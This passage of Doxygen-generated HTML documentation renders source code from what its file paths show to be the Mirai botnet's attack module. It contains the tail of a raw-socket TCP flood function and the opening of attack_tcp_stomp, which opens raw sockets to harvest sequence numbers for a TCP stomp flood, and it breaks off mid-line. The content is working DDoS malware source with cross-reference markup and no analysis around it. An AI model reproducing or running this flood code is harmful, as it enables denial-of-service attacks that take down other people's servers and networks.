0xffff)</div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;                tcph-&gt;seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;            <span class="keywordflow">if</span> (ack == 0xffff)</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;                tcph-&gt;ack_seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;</div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;            <span class="comment">// Randomize packet content?</span></div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;            tcph-&gt;check = 0;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;            tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;            targs[i].sock_addr.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;        }</div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;    }</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="attack_8h_html_a4f086d53d4494633a898fbd9886b08bf"><div class="ttname"><a href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a></div><div class="ttdeci">#define ATK_OPT_SYN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00061">attack.h:61</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="attack_8h_html_a4464ea34ef73875f57b5c6a412aaac20"><div class="ttname"><a href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a></div><div class="ttdeci">#define ATK_OPT_RST</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00060">attack.h:60</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8h_html_a5a6f282c43f088516dce2de1b69ae7d8"><div class="ttname"><a href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a></div><div class="ttdeci">#define ATK_OPT_URG</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00057">attack.h:57</a></div></div>
<div class="ttc" id="attack_8h_html_a97b7c19adba8f5e25d603d4fcd80c995"><div class="ttname"><a href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a></div><div class="ttdeci">#define ATK_OPT_SEQRND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00063">attack.h:63</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8c_html_a51262dda96f2861dbd13fc0b6f0a31d3"><div class="ttname"><a href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a></div><div class="ttdeci">uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00216">attack.c:216</a></div></div>
<div class="ttc" id="attack_8h_html_a2ad2949e3a473ebba047e474abf5d461"><div class="ttname"><a href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a></div><div class="ttdeci">#define ATK_OPT_FIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00062">attack.h:62</a></div></div>
<div class="ttc" id="attack_8h_html_a9b14feb6720fefac0c6da63a77da718e"><div class="ttname"><a href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a></div><div class="ttdeci">#define ATK_OPT_SOURCE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00071">attack.h:71</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="attack_8h_html_a61c202b303f42c57328c999b1104877d"><div class="ttname"><a href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a></div><div class="ttdeci">#define ATK_OPT_ACK</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00058">attack.h:58</a></div></div>
<div class="ttc" id="attack_8h_html_a5ae76926414352bb8e12896c5581a0fd"><div class="ttname"><a href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a></div><div class="ttdeci">#define ATK_OPT_PSH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00059">attack.h:59</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="attack_8h_html_a0fcd18d4c1705cc62b8a2d3f92e0a780"><div class="ttname"><a href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a></div><div class="ttdeci">#define ATK_OPT_ACKRND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00064">attack.h:64</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="aff68f7c623b860ed728b0343b955e1a4"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_tcp_stomp </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__tcp_8c_source.html#l00293">293</a> of file <a class="el" href="attack__tcp_8c_source.html">attack_tcp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00080">attack_stomp_data::ack_seq</a>, <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00079">attack_stomp_data::addr</a>, <a class="el" href="attack_8h_source.html#l00058">ATK_OPT_ACK</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00062">ATK_OPT_FIN</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00047">ATK_OPT_PAYLOAD_RAND</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00059">ATK_OPT_PSH</a>, <a class="el" href="attack_8h_source.html#l00060">ATK_OPT_RST</a>, <a class="el" href="attack_8h_source.html#l00061">ATK_OPT_SYN</a>, <a class="el" href="attack_8h_source.html#l00057">ATK_OPT_URG</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="ForumPost_8txt_source.html#l00001">connect</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="attack_8h_source.html#l00081">attack_stomp_data::dport</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="rand_8c_source.html#l00032">rand_str()</a>, <a class="el" href="attack_8h_source.html#l00080">attack_stomp_data::seq</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, <a class="el" href="attack_8h_source.html#l00081">attack_stomp_data::sport</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;{</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;    <span class="keywordtype">int</span> i, rfd;</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__stomp__data.html">attack_stomp_data</a> *stomp_data = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structattack__stomp__data.html">attack_stomp_data</a>));</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> <a class="code" href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">dport</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> urg_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> ack_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> psh_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> rst_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> syn_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> fin_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 768);</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;    <span class="comment">// Set up receive socket</span></div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;    <span class="keywordflow">if</span> ((rfd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;    {</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;        printf(<span class="stringliteral">&quot;Could not open raw socket!\n&quot;</span>);</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;    }</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;    i = 1;</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;    <span class="keywordflow">if</span> (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;    {</div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00326"></a><span class="lineno">  326</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(rfd);</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00328"></a><span class="lineno">  328</span>&#160;    }</div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;    <span class="comment">// Retrieve all ACK/SEQ numbers</span></div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;    {</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;        <span class="keywordtype">int</span> fd;</div><div class="line"><a name="l00334"></a><span class="lineno">  334</span>&#160;        <span class="keyword">struct </span>sockaddr_in addr, recv_addr;</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;        socklen_t recv_addr_len;</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;        <span class="keywordtype">char</span> pktbuf[256];</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;        time_t start_recv;</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;        stomp_setup_nums:</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;</div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;        <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_STREAM, 0)) == -1)</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;        {</div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;            printf(<span class="stringliteral">&quot;Failed to create socket!\n&quot;</span>);</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;        }</div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;        <span class="comment">// Set it in nonblocking mode</span></div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;        fcntl(fd, F_SETFL, fcntl(fd, 